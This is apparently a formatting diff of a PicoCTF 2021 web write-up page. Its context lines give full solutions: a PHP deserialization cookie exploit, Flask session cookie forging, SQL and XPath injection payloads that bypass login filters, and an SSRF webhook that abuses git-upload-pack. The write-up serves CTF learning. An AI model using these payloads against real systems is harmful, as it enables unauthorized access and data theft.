@@ -8,7 +8,7 @@ description: Writeups for PicoCTF 2021 Challenges
 
 Here are the web challenges that I completed in PicoCTF 2021
 
-### Get aHEAD <a id="getahead"></a>
+### Get aHEAD <a href="#getahead" id="getahead"></a>
 
 **Description:** Find the flag being held on this server to get ahead of the competition
 
@@ -101,29 +101,29 @@ By inspecting the source code I noticed this
       </div>
 ```
 
-Inspecting the CSS I noticed 
+Inspecting the CSS I noticed&#x20;
 
-```text
+```
 /* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
 ```
 
-Assuming I will find something in the JS file too, I found `/* How can I keep Google from indexing my website? */` After a quick google search, I figured it's **robots.txt** where I found 3rd part and a hint 
+Assuming I will find something in the JS file too, I found `/* How can I keep Google from indexing my website? */` After a quick google search, I figured it's **robots.txt** where I found 3rd part and a hint&#x20;
 
-```text
+```
 # Part 3: t_0f_pl4c
 # I think this is an apache server... can you Access the next flag?
 ```
 
 Working a lot with apache servers in the good 'ol days, I know it has to be **.htaccess**. Surpise, Surprise
 
-```text
+```
 # Part 4: 3s_2_lO0k
 # I love making websites on my Mac, I can Store a lot of information there.
 ```
 
 I know Mac creates hidden files like `.DS_Store` so let's look for that
 
-```text
+```
 Congrats! You completed the scavenger hunt. Part 5: _a69684fd}
 ```
 
@@ -131,7 +131,7 @@ Awesome!!
 
 **Flag:** picoCTF{th4ts\_4\_l0t\_0f\_pl4c3s\_2\_lO0k\_a69684fd}
 
-### Some Assembly Required 1
+### Some Assembly Required 1&#xD;
 
 **Points:** 70
 
@@ -139,7 +139,7 @@ Awesome!!
 
 Judging by the title it probably has something to do with Assembly language, Since it's a web challenge. It's probably Web Assembly, Let's see if there is a WASM file imported.
 
-```text
+```
     i32.load offset=12
     local.set $var5
     local.get $var4
@@ -158,7 +158,7 @@ There is and it also has the flag.
 
 **Flag:** picoCTF{a2843c6ba4157dc1bc052818a6242c3f}
 
-### More Cookies
+### More Cookies&#xD;
 
 **Description:** I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!
 
@@ -170,7 +170,7 @@ Looking at the website, This is a continuation of the "Cookies" challenge. So le
 
 This time the page reads "Welcome to my cookie search page. Only the admin can use it!" and the cookie is
 
-```text
+```
 auth_name=UXVDRDhEMmNrbTFCV25jbzdheFBjbHNmOWErZnNJdnY5Nk5pUkVNTkVXYUdRK0FVSk9tTGtRT3h1a0dWSDJrbmNHSUxsRTlNR2FZZFJaZ3RRb09EdngyUnd6L3FlbCtPSmZjbnJUVE5pWnVVUHNDQ1lJdFkzbTI4N29NWWxBRU4=
 ```
 
@@ -207,9 +207,9 @@ for i in range(128):
       break
 ```
 
-**Flag:**  picoCTF{cO0ki3s\_yum\_82f39377}
+**Flag:** picoCTF{cO0ki3s\_yum\_82f39377}
 
-### Who are you?
+### Who are you?&#xD;
 
 **Description:** Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn
 
@@ -219,7 +219,7 @@ for i in range(128):
 
 **Stage 1:**
 
-![](../.gitbook/assets/image%20%283%29.png)
+![](<../.gitbook/assets/image (3).png>)
 
 This is the only thing I see on the website, Let's look at the hints
 
@@ -227,11 +227,11 @@ This is the only thing I see on the website, Let's look at the hints
 **Hint 1:** It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616
 {% endhint %}
 
-So, I have to set special headers for this, After looking through [**Mozilla HTTP Header Docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) ****I found a header `User-Agent` which contains information regarding the browser, So I set it to **"picobrowser"**
+So, I have to set special headers for this, After looking through [**Mozilla HTTP Header Docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) **** I found a header `User-Agent` which contains information regarding the browser, So I set it to **"picobrowser"**
 
 **Stage 2:**
 
-![](../.gitbook/assets/image%20%285%29.png)
+![](<../.gitbook/assets/image (5).png>)
 
 After changing the header related to the browser, This is what I see. After looking through headers that relate to information regarding the previous site. I found `Referer` I changed it to the same URL.
 
@@ -239,52 +239,52 @@ After changing the header related to the browser, This is what I see. After look
 
 **Stage 3:**
 
-![](../.gitbook/assets/image%20%287%29.png)
+![](<../.gitbook/assets/image (7).png>)
 
 After passing the previous stage, Now I see this. It is asking us to visit it from 2018. I know that there is a header for **"Date"**, so I changed it to a date back in 2018.
 
-`Date: Date: Fri, 1 Dec 2018` 
+`Date: Date: Fri, 1 Dec 2018`&#x20;
 
 **Stage 4:**
 
-![](../.gitbook/assets/image%20%284%29.png)
+![](<../.gitbook/assets/image (4).png>)
 
-This time I need to set a header for "Do Not Track" which is `DNT`  
+This time I need to set a header for "Do Not Track" which is `DNT`\
 `DNT: 1`
 
 **Stage 5:**
 
-![](../.gitbook/assets/image%20%282%29.png)
+![](<../.gitbook/assets/image (2).png>)
 
 This time, We need to access this from Sweden, My first instinct was VPN but so far we only used Headers to reach here. So I looked for another header that may reveal about location, I found `X-Forwarded-For` I changed it to the first IP I found on googling "Sweden IP address"
 
-`X-Forwarded-For: 83.254.0.167`  
+`X-Forwarded-For: 83.254.0.167`&#x20;
 
 **Stage 6:**
 
-![](../.gitbook/assets/image%20%2810%29.png)
+![](<../.gitbook/assets/image (10).png>)
 
-This is an easy one, I need to change the `Accept-Language` header, I set it to `sv-en` 
+This is an easy one, I need to change the `Accept-Language` header, I set it to `sv-en`&#x20;
 
-`Accept-Language: sv-en` 
+`Accept-Language: sv-en`&#x20;
 
 **Result:**
 
-![](../.gitbook/assets/image%20%289%29.png)
+![](<../.gitbook/assets/image (9).png>)
 
 Finally, we have our flag!
 
 **Flag:** picoCTF{http\_h34d3rs\_v3ry\_c0Ol\_much\_w0w\_20ace0e4}
 
-### Some Assembly Required 2
+### Some Assembly Required 2&#xD;
 
 **Points:** 110
 
 #### **Solution**
 
-Like the "Some Assembly Required 1" challenge this is also related to Web Assembly. I opened the imported WASM file in Chrome Developer Tools and here's what I found towards the end \(Place where I found the flag for 1st part\)
+Like the "Some Assembly Required 1" challenge this is also related to Web Assembly. I opened the imported WASM file in Chrome Developer Tools and here's what I found towards the end (Place where I found the flag for 1st part)
 
-```text
+```
     end $label0
     local.get $var4
     i32.load offset=12
@@ -301,13 +301,13 @@ Like the "Some Assembly Required 1" challenge this is also related to Web Assemb
 )
 ```
 
-> xakgK\5cNsmn;j8j&lt;9;&lt;?=l?k88mm1n9i1j&gt;:8k?l0u\00\00
+> xakgK\5cNsmn;j8j<9;\<?=l?k88mm1n9i1j>:8k?l0u\00\00
 
 This looks like it's encrypted, To figure out the encryption, I used **this website**. It tries all standard XOR decryptions at once. Using `XOR({'option':'Hex','string':'8'},'Standard',false)` the encrypted text outputs: `picoCTF{ef3b0b413475d7c00ee9f1a9b620c7d8}T88T88` , Great!
 
 **Flag:** picoCTF{ef3b0b413475d7c00ee9f1a9b620c7d8}
 
-### Super Serial
+### Super Serial&#xD;
 
 **Description:** Try to recover the flag stored on this website
 
@@ -321,9 +321,9 @@ As soon as you open the website you're prompted with a login screen. There isn't
 **Hint 1:** The flag is at ../flag
 {% endhint %}
 
-So we need to figure out a way to read that file, I tried to brute force for other pages on the URL and found `/robots.txt` 
+So we need to figure out a way to read that file, I tried to brute force for other pages on the URL and found `/robots.txt`&#x20;
 
-```text
+```
 User-agent: *
 Disallow: /admin.phps
 ```
@@ -350,7 +350,7 @@ if(isset($_POST["user"]) && isset($_POST["pass"])){
 ?>
 ```
 
-As expected from the name it's a deserialization exploit \(see line 10\). Here we can also see two more files. `cookie.php` and `authentication.php` let's look at authentication.phps first.
+As expected from the name it's a deserialization exploit (see line 10). Here we can also see two more files. `cookie.php` and `authentication.php` let's look at authentication.phps first.
 
 ```php
 <?php
@@ -403,9 +403,9 @@ if(isset($_COOKIE["login"])){
 
 ```
 
- Here's what I found towards the end. It was what we wanted. `$perm` is unserializing the cookie and is echoed \(`die("Deserialization error. ".$perm);`\) when the functions `is_guest()` and `is_admin()` are not found. So we need to pass `access_log("../flag")` to it. 
+&#x20;Here's what I found towards the end. It was what we wanted. `$perm` is unserializing the cookie and is echoed (`die("Deserialization error. ".$perm);`) when the functions `is_guest()` and `is_admin()` are not found. So we need to pass `access_log("../flag")` to it.&#x20;
 
-First, let's serialize and encode it in base64 so it gives the expected output on `unserialize(base64_decode(urldecode()))` 
+First, let's serialize and encode it in base64 so it gives the expected output on `unserialize(base64_decode(urldecode()))`&#x20;
 
 Here's our exploit
 
@@ -440,22 +440,22 @@ echo urlencode(base64_encode(serialize($pwn)));
 
 The `cookie.php` reads from the cookie `login` so we will set our exploit as
 
-```text
+```
 login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
 ```
 
-Now let's go to `authentication.php` where the `access_log` class exists.  
+Now let's go to `authentication.php` where the `access_log` class exists.\
 
 
-![](../.gitbook/assets/image%20%281%29.png)
+![](<../.gitbook/assets/image (1).png>)
 
 There you go!
 
 **Flag:** picoCTF{th15\_vu1n\_1s\_5up3r\_53r1ous\_y4ll\_66832978}
 
-### Most Cookies
+### Most Cookies&#xD;
 
-**Description:** Alright, enough of using my own encryption. Flask session cookies should be plenty secure! 
+**Description:** Alright, enough of using my own encryption. Flask session cookies should be plenty secure!&#x20;
 
 **Points:** 150
 
@@ -525,9 +525,9 @@ if __name__ == "__main__":
 
 ```
 
-You can see the `flag()` function for the display endpoint. It reads the `very_auth` cookie and checks if it is "admin" if yes, then it will show us the flag. Flask cookies use JWT to created a signed token we need to find the secret. From the above source code we can see from lines 6 and 7 that the secret is a random word from `cookie_names` list. If we can figure out which one is it then we can create a signed token for `very_auth=admin` 
+You can see the `flag()` function for the display endpoint. It reads the `very_auth` cookie and checks if it is "admin" if yes, then it will show us the flag. Flask cookies use JWT to created a signed token we need to find the secret. From the above source code we can see from lines 6 and 7 that the secret is a random word from `cookie_names` list. If we can figure out which one is it then we can create a signed token for `very_auth=admin`&#x20;
 
-I found a python library called ****[**flask-unsign**](https://github.com/Paradoxis/Flask-Unsign) ****which has useful tools to decrypt the cookie and also brute-force for the secret. First, let us decrypt the cookie `session` set by the server using
+I found a python library called **** [**flask-unsign**](https://github.com/Paradoxis/Flask-Unsign) **** which has useful tools to decrypt the cookie and also brute-force for the secret. First, let us decrypt the cookie `session` set by the server using
 
 ```python
 $ flask-unsign --decode --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YG7ogw.sUaN7zHrEh4nQUr7qe7JfcFeynY
@@ -535,7 +535,7 @@ $ flask-unsign --decode --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YG7ogw.sUaN7zHrEh4
 # {'very_auth': 'blank'}
 ```
 
-We can use this token to brute force for secret from the word list provided using a `flask-unsign` and a text file \(cookies.txt\) consisting of the words from the list `cookie_name` Then we can use the following command to find the secret from the list.
+We can use this token to brute force for secret from the word list provided using a `flask-unsign` and a text file (cookies.txt) consisting of the words from the list `cookie_name` Then we can use the following command to find the secret from the list.
 
 ```python
 $ flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YG7ogw.sUaN7zHrEh4nQUr7qe7JfcFeynY --wordlist cookies.txt
@@ -554,11 +554,11 @@ $ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'kiss'
 
 Let's change the cookie value of `session` to our generated token.
 
-![](../.gitbook/assets/image%20%288%29.png)
+![](<../.gitbook/assets/image (8).png>)
 
 **Flag:** picoCTF{pwn\_4ll\_th3\_cook1E5\_478da04c}
 
-### Web Gauntlet 2
+### Web Gauntlet 2&#xD;
 
 **Description:** This website looks familiar... Log in as admin Site: ... Filter: ...
 
@@ -568,32 +568,32 @@ Let's change the cookie value of `session` to our generated token.
 
 This challenge is apparently a continuation of the "Web Gauntlet" challenge. Here, we are provided with two URLs one for login and another is for filters. Login is the page you'll need to exploit and bypass the form and gain access. "Filters" shows the list of keywords that are not allowed in the injection. Let's have a look at filters:
 
-> Filters: or and true false union like = &gt; &lt; ; -- /\* \*/ admin
+> Filters: or and true false union like = > < ; -- /\* \*/ admin
 
 We can not use the above keywords in our injection. As mentioned on the login page. The server uses SQLite for the database. Here our username should be "admin" but we cannot use it due to filters so we need to find a way to enter the `username=admin` without spelling it.
 
 **The query for username:**
 
-We can use the "[CONCAT Operator](https://www.sqlitetutorial.net/sqlite-string-functions/sqlite-concat/)" which is `||` using this operator we can concatenate strings, For example: `'Pico'||'CTF'` will give us `'PicoCTF'` 
+We can use the "[CONCAT Operator](https://www.sqlitetutorial.net/sqlite-string-functions/sqlite-concat/)" which is `||` using this operator we can concatenate strings, For example: `'Pico'||'CTF'` will give us `'PicoCTF'`&#x20;
 
 We can use this for "admin": `'a'||'dmin'`
 
 **The query for the password:**
 
-This is a tricky one because the filters pretty much block all mainstream operators like `=><` and we can't even comment out the rest of the query because `;/**/` are blocked too. But SQLite has several interesting operators apart from these that can be used for boolean expressions. One such operator is "GLOB" which is similar to the "LIKE" operator in MySQL. The query `password GLOB '*'` means that "a password with at least length one, which should return true, But in our case, we can't change the characters before query as in the query already has `password = '` we can not get rid of the `= '` 
+This is a tricky one because the filters pretty much block all mainstream operators like `=><` and we can't even comment out the rest of the query because `;/**/` are blocked too. But SQLite has several interesting operators apart from these that can be used for boolean expressions. One such operator is "GLOB" which is similar to the "LIKE" operator in MySQL. The query `password GLOB '*'` means that "a password with at least length one, which should return true, But in our case, we can't change the characters before query as in the query already has `password = '` we can not get rid of the `= '`&#x20;
 
 Here's where we'll use a dirty trick. We can use an invalid expression that always returns true for everything: `column='' GLOB '*'` this statement isn't technically invalid but returns true. Let's understand it with a better example.
 
-Consider this, the query `SELECT * FROM table WHERE name = "Jake" = False` is same as `SELECT * FROM table WHERE name != "Jake"` which means the second `=` actually returns True/False value of the first one. 
+Consider this, the query `SELECT * FROM table WHERE name = "Jake" = False` is same as `SELECT * FROM table WHERE name != "Jake"` which means the second `=` actually returns True/False value of the first one.&#x20;
 
-The query `SELECT * FROM table WHERE name = "Jake"` has two objects one where the rows meet the condition \(True\) and the other where the rows do not meet the condition \(False\). So our query `password = '' GLOB '*'` basically translates to 'return True and False rows for `password=''` which is always True
+The query `SELECT * FROM table WHERE name = "Jake"` has two objects one where the rows meet the condition (True) and the other where the rows do not meet the condition (False). So our query `password = '' GLOB '*'` basically translates to 'return True and False rows for `password=''` which is always True
 
 **Final Injection**
 
-**Username:** `a'||'dmin`  
-**Password:** `'GLOB'*` ****
+**Username:** `a'||'dmin`\
+**Password:** `'GLOB'*` ****&#x20;
 
-  
+****\
 **Final Query**
 
 ```sql
@@ -602,11 +602,11 @@ SELECT username, password FROM users WHERE username='a'||'dmin' AND password=''G
 
 The character limit is 35 but our password is just 7 characters long! Let's enter it into the login page
 
-![](../.gitbook/assets/image%20%2816%29.png)
+![](<../.gitbook/assets/image (16).png>)
 
 **Flag:** picoCTF{0n3\_m0r3\_t1m3\_fc0f841ee8e0d3e1f479f1a01a617ebb}
 
-### X marks the spot
+### X marks the spot&#xD;
 
 **Description:** Another login you have to bypass. Maybe you can find an injection that works?
 
@@ -620,15 +620,15 @@ The link takes you to a login screen that reads "Only I know the password, and I
 **Hint 1:** XPATH
 {% endhint %}
 
-So, this is an XPath injection. This is not like any of the injections before. I tried bypassing the login with always true queries but they do not work, However, There is an interesting message that pops up when I enter an always true booleans like `' or 1=1 or 'a` 
+So, this is an XPath injection. This is not like any of the injections before. I tried bypassing the login with always true queries but they do not work, However, There is an interesting message that pops up when I enter an always true booleans like `' or 1=1 or 'a`&#x20;
 
-![](../.gitbook/assets/image%20%2814%29.png)
+![](<../.gitbook/assets/image (14).png>)
 
-It says "You're on the right path." I tried to change things a little bit and used a false query like `' and 1=2 and 'a'='a` 
+It says "You're on the right path." I tried to change things a little bit and used a false query like `' and 1=2 and 'a'='a`&#x20;
 
-![](../.gitbook/assets/image%20%2817%29.png)
+![](<../.gitbook/assets/image (17).png>)
 
-Now it says "Login failure." This means that it's a Blind XPATH injection which means we have to figure out the username and password using queries. Here we can use **"starts-wth\(\)"** operator. Which returns true if the passed characters are at the beginning of a document. We do not know the column names yet so we can use `//*` which basically means check for all documents \(columns\). I tried testing it with `' or //*[starts-with(text(),'a')] or 'a'='b` which interestingly enough returned true. I tried again with `' or //*[starts-with(text(),'ab')] or 'a'='b` which returned false. 
+Now it says "Login failure." This means that it's a Blind XPATH injection which means we have to figure out the username and password using queries. Here we can use **"starts-wth()"** operator. Which returns true if the passed characters are at the beginning of a document. We do not know the column names yet so we can use `//*` which basically means check for all documents (columns). I tried testing it with `' or //*[starts-with(text(),'a')] or 'a'='b` which interestingly enough returned true. I tried again with `' or //*[starts-with(text(),'ab')] or 'a'='b` which returned false.&#x20;
 
 We can actually write a script that runs through all the combinations and stacks the successful characters upon success. Here's the Python script that I made
 
@@ -656,11 +656,11 @@ while True:
 
 I tried running the above script several times before which returned with values like admin, bob, thisisnottheflag then I figured that we are supposed to look for the flag itself, not some password. so I started with the standard starting format `picoCTF{` after running for a while, I finally got the full flag.
 
-![](../.gitbook/assets/image%20%2820%29.png)
+![](<../.gitbook/assets/image (20).png>)
 
 **Flag:** picoCTF{h0p3fully\_u\_t0ok\_th3\_r1ght\_xp4th\_a56016ef}
 
-### Web Gauntlet 3
+### Web Gauntlet 3&#xD;
 
 **Description:** Last time, I promise! Only 25 characters this time. Log in as admin
 
@@ -670,10 +670,10 @@ I tried running the above script several times before which returned with values
 
 This is the same challenge as the "Web Gauntlet 2" but this time we are only allowed to use 25 characters for our injection. We can solve this using the exact same injection because last time our query was only 7 characters.
 
-**Username:** `a'||'dmin`  
-**Password:** `'GLOB'*` ****
+**Username:** `a'||'dmin`\
+**Password:** `'GLOB'*` ****&#x20;
 
-![](../.gitbook/assets/image%20%2818%29.png)
+![](<../.gitbook/assets/image (18).png>)
 
 **Flag:** picoCTF{k3ep\_1t\_sh0rt\_30593712914d76105748604617f4006a}
 
@@ -685,11 +685,11 @@ This is the same challenge as the "Web Gauntlet 2" but this time we are only all
 
 #### **Solution**
 
-This is the last challenge of Web Exploit and also has the highest points in the web section. Here we are also given source code. 
+This is the last challenge of Web Exploit and also has the highest points in the web section. Here we are also given source code.&#x20;
 
 This is basically a clone of GitHub it has features like webhooks, collaborators, etc. The flag is hidden at `_/<username>.git` but we do not have access to read it. So we need to figure out a way to gain read access to the repo.
 
-Let's go through the source code, Here's an interesting thing I found in `auth-api.ts` 
+Let's go through the source code, Here's an interesting thing I found in `auth-api.ts`&#x20;
 
 ```typescript
     const sourceIp = req.socket.remoteAddress;
@@ -702,23 +702,23 @@ Let's go through the source code, Here's an interesting thing I found in `auth-a
     return next();
 ```
 
-You notice that requests from localhost \(127.0.0.1\) are given admin access and all endpoints from `git-api.ts` can be freely accessed by admins.
+You notice that requests from localhost (127.0.0.1) are given admin access and all endpoints from `git-api.ts` can be freely accessed by admins.
 
-The server has a webhook feature that we can use to send a request from the server to the server itself \(SSRF\). But this way we can't really read any data because there is no way to echo the data back from the endpoint that was accessed by web-hook.
+The server has a webhook feature that we can use to send a request from the server to the server itself (SSRF). But this way we can't really read any data because there is no way to echo the data back from the endpoint that was accessed by web-hook.
 
 However there is one thing we could do here, We can add ourselves as a collaborator to `_/<username>.git` since admin has rights to all the endpoints we can send a request to git upload endpoint `/:user/:repo.git/git-upload-pack` which is responsible for updating the repo on git.
 
 **The Plan**
 
 1. Create a payload for adding a collaborator to a repository
-2. Create a webhook that sends a POST request to `_127.0.0.1:1823/<username>.git/git-upload-pack` 
+2. Create a webhook that sends a POST request to `_127.0.0.1:1823/<username>.git/git-upload-pack`&#x20;
 3. Use this payload to push to `_/<username>.git` using webhook
 
 Notice, we need to send this to that 1823 port because that's where the server is actually running locally. You can find this from the Dockerfile provided.
 
 **Step 1**
 
-Let us create a user with username: "abbas" and password: "abbas" on bithug. Now, create a repository named "abbas". We will clone this repository locally using 
+Let us create a user with username: "abbas" and password: "abbas" on bithug. Now, create a repository named "abbas". We will clone this repository locally using&#x20;
 
 ```bash
 git clone http://abbas@venus.picoctf.net:49771/abbas/abbas.git
@@ -726,7 +726,7 @@ git clone http://abbas@venus.picoctf.net:49771/abbas/abbas.git
 
 Now, we'll need to add a collaborator, we can find instructions on the repository page
 
-![](../.gitbook/assets/image%20%2819%29.png)
+![](<../.gitbook/assets/image (19).png>)
 
 Let us add a collaborator using
 
@@ -737,18 +737,18 @@ $ git add access.conf
 $ git commit -m "Added a user to the repo"
 ```
 
-Do not push it yet, we need to capture this request. I am going to use [Wireshark ](https://www.wireshark.org/)for this. After starting "capture" on Wireshark, `git push origin @:refs/meta/config`  
+Do not push it yet, we need to capture this request. I am going to use [Wireshark ](https://www.wireshark.org)for this. After starting "capture" on Wireshark, `git push origin @:refs/meta/config`\
 
 
-![](../.gitbook/assets/image%20%2812%29.png)
+![](<../.gitbook/assets/image (12).png>)
 
 Here is the `http` stream from Wireshark, You'll notice that there is a `POST` request. That's what we need.
 
-![](../.gitbook/assets/image%20%2815%29.png)
+![](<../.gitbook/assets/image (15).png>)
 
 Highlighted is the data we need, let us copy it in the Hex string format which should look like this
 
-```text
+```
 "\x30\x30\x39\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x61\x32\x31\x32\x39\x39\x38\x61\x35\x65\x63\x32\x36\x37\x31\x35\x37\x61\x33\x39\x62\x64\x62\x37\x39\x30\x64\x33\x30\x33\x30\x39\x34\x38\x32\x65\x35\x31\x34\x32\x20\x72\x65\x66\x73\x2f\x6d\x65\x74\x61\x2f\x63\x6f\x6e\x66\x69\x67\x00\x20\x72\x65\x70\x6f\x72\x74\x2d\x73\x74\x61\x74\x75\x73\x20\x73\x69\x64\x65\x2d\x62\x61\x6e\x64\x2d\x36\x34\x6b\x20\x61\x67\x65\x6e\x74\x3d\x67\x69\x74\x2f\x32\x2e\x32\x35\x2e\x31\x30\x30\x30\x30\x50\x41\x43\x4b\x00\x00\x00\x02\x00\x00\x00\x03\x9b\x0c\x78\x9c\xa5\xcc\x41\x0a\xc2\x30\x10\x40\xd1\x7d\x4e\x31\x7b\x51\x32\x93\xc6\xb6\x20\xa2\xa8\x0b\x2d\xa8\xa0\x17\x48\x9b\x29\x2d\xb4\x8e\xc4\xe9\xfd\xad\x67\x70\xf3\x17\x7f\xf1\x34\x31\x03\x65\x8e\x1a\xcc\x0b\x8a\x31\xf7\x59\x41\xd4\xd6\xe4\x83\x2d\x33\xf2\x6d\x64\x6c\x69\x7e\xd6\xd5\xa5\x09\x93\x76\x92\x20\x89\x28\x6c\x7e\xdd\x1d\x4f\x8f\xea\x79\xbb\x2f\xaf\x87\x73\x75\x41\xb7\x1a\xa4\x09\x43\x94\x31\xf4\xaf\x2d\xe0\x1a\xf3\xd2\x7a\x24\x84\x85\xf5\xce\x9a\x46\xc6\xb1\x57\xe5\x3f\x08\xb3\x8f\x91\x23\x04\x98\x3e\x33\xa3\x02\xda\x31\x24\x7e\x8b\xf9\x02\xc2\xda\x3c\x04\xa7\x02\x78\x9c\x33\x34\x30\x30\x33\x31\x51\x48\x4c\x4e\x4e\x2d\x2e\xd6\x4b\xce\xcf\x4b\x63\xf8\x1c\x5b\xcb\xe7\xce\xf0\xfb\x6d\x65\xac\xeb\xc3\x59\x2b\x97\x33\x3e\x33\xf3\xb8\x0f\x00\x0b\xd6\x0f\xca\x36\x78\x9c\x4b\x4c\x4a\x4a\x2c\xe6\x02\x00\x07\xd1\x02\x04\x30\x9a\x4e\xdf\x99\x0e\xe6\x14\xcf\xdf\xbf\x9f\x2b\x17\xad\x88\x60\x16\x21\x12"
 ```
 
@@ -777,7 +777,7 @@ print(base64.encodebytes(hex_string))
 
 This will give us the body of our webhook, it should look like this
 
-```text
+```
 MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==
 ```
 
@@ -882,7 +882,6 @@ $ git push
 
 Perfect! Now let us try to open `_/abbas` on Bithug.
 
-![](../.gitbook/assets/image%20%2813%29.png)
+![](<../.gitbook/assets/image (13).png>)
 
 **Flag:** picoCTF{good\_job\_at\_gitting\_good}
-
